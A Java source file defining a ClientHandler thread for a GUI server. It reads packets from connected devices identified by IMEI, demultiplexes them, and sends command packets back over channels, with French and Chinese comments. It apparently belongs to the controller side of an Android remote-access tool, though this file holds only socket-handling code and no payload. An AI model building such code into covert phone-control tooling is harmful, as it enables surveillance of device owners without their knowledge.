package com.android.security.gui.server;

 
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.ByteBuffer;

import com.android.security.gui.GUI;
import com.android.security.in.Demux;
import com.android.security.in.Receiver;
import com.android.security.inout.Protocol;
import com.android.security.out.Mux;
import com.android.security.packages.CommandPacket;
import com.android.security.packages.Packet;

 
public class ClientHandler extends Thread {
	private String imei;
	private Socket clientSocket;
	private Receiver receiver;
	private Server server;
	private Demux demux;
	private Mux mux;
	private ByteBuffer buffer;
	private boolean connected;
	private GUI mainGUI;

	public ClientHandler(Socket your_socket, String id, Server s, GUI mainGUI)
			throws IOException {
		this.mainGUI = mainGUI;
		server = s;
		imei = id;
		clientSocket = your_socket;
		receiver = new Receiver(clientSocket);
		demux = new Demux(server, imei);
		mux = new Mux(new DataOutputStream(clientSocket.getOutputStream()));
		connected = true;
		buffer = ByteBuffer.allocate(Protocol.MAX_PACKET_SIZE);
		buffer.clear();

	}

	// attend des donn�es du Receiver et les transmet au Demultiplexeur
	public void run() {
/*		while (connected) {
			try {
				buffer = receiver.read(buffer);
				try {
					if (demux.receive(buffer)) {
						System.out.println("Restant: " + buffer.remaining()
								+ " Position: " + buffer.position()
								+ " Limit: " + buffer.limit());
						buffer.compact();
					}
				} catch (Exception e) {
					connected = false;
					server.getGui().logErrTxt(
							"错误，解包接收数据错误(Demux) --: " + e.toString());
					e.printStackTrace();
				}

			} catch (IOException e) {
				connected = false;
				try {

					clientSocket.close();
					mainGUI.deleteUser(imei);
				} catch (IOException e1) {
					server.getGui().logErrTxt("接收数据包错误(Receiver)");
				}
			} catch (IndexOutOfBoundsException e) {
				e.printStackTrace();
				server.getGui().logErrTxt("客户端不存在!");
				connected = false;
				try {
					clientSocket.close();
					mainGUI.deleteUser(imei);
				} catch (IOException e1) {
					server.getGui().logErrTxt("客户端已关闭该连接，不能关闭该连接");
				}
			}
		}
		server.DeleteClientHandler(imei);*/

		while (connected) {
			try {
				this.buffer = this.receiver.read(this.buffer);
			} catch (IOException e) {
				this.server.DeleteClientHandler(this.imei);
				break;
			} catch (IndexOutOfBoundsException e) {
				this.server.DeleteClientHandler(this.imei);
				break;
			}

			try {
				if (!this.demux.receive(this.buffer))
					continue;
				this.buffer.compact();
			} catch (Exception e) {
				server.getGui().logErrTxt("无法解析设备 " + this.imei + " 发送来的数据: " + e.getMessage());
			}
		}

		this.server.DeleteClientHandler(imei);
	}

	// transmet les donn�es � envoyer au Multiplexeur
	public void toMux(short command, int channel, byte[] args) {
		Packet packet = new CommandPacket(command, channel, args);
		mux.send(0, packet.build());

		//com.android.security.gui.server.getGui().logTxt("Request sent :" + command + ",on the channel "+ channel);


	}

	public void updateIMEI(String i) {
		imei = i;
		demux.setImei(imei);
	}

	public void disconnect(String reasonText) {
		try {
			clientSocket.close();
		} catch (IOException localIOException) {
		}
		server.getGui().logErrTxt(reasonText);
	}

	public void disconnect() {
		try {
			clientSocket.close();
		} catch (IOException localIOException) {
		}
	}
}
